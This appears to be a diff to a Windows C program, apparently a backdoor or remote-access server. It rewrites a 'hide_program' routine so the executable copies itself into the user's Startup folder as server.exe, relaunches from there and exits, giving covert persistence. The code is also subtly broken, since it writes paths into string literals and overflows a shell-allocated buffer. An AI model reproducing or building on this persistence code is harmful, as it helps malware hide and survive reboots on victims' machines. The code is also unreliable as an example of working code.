@@ -1,3 +1,6 @@
+#define _CRT_SECURE_NO_WARNINGS
+#define UNICODE
+
 #include <stdio.h>
 #include <winsock2.h>
 #include <windows.h>
@@ -20,13 +23,23 @@ enum run_mode {
     ENABLED
 };
 
-void hide_program() {
-    char target_path[MAX_PATH] = "C:\\server.exe";
-    char current_path[MAX_PATH] = "";
 
-    if (strcmp(current_path, target_path) == 0) return;
+void add_program_to_autostart() {
+    LPWSTR current_path = L"";
+    LPWSTR target_path = L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\server.exe";
+
+    LPWSTR appdata_folder = L"";
+
     GetModuleFileName(NULL, current_path, MAX_PATH);
-    CopyFile(current_path, target_path, 0);
+    SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
+    unsigned int l = wcslen((const unsigned short *) appdata_folder);
+    wcscpy(&appdata_folder[l], target_path);
+
+    if (wcscmp(appdata_folder, current_path) == 0) return;
+
+
+
+    CopyFile(current_path, appdata_folder, 0);
 
     STARTUPINFO startup_info;
     PROCESS_INFORMATION process_info;
@@ -35,7 +48,7 @@ void hide_program() {
     memset(&process_info, 0, sizeof(PROCESS_INFORMATION));
 
     BOOL rv = CreateProcess(
-            target_path,
+            appdata_folder,
             NULL,
             NULL,
             NULL,
@@ -49,22 +62,6 @@ void hide_program() {
 
 
     exit(0);
-
-}
-
-void add_program_to_autostart() {
-    char current_path[MAX_PATH] = "";
-    char target_path[MAX_PATH] = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\file.txt";
-
-    char appdata_folder[MAX_PATH] = "";
-
-    GetModuleFileName(NULL, current_path, MAX_PATH);
-    SHGetKnownFolderPath(&FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &appdata_folder);
-    unsigned int l = wcslen((const unsigned short *) appdata_folder);
-    strcpy_s(&appdata_folder[l], MAX_PATH, (const char *) target_path);
-
-
-    CopyFile(current_path, (LPCSTR) appdata_folder, 0);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
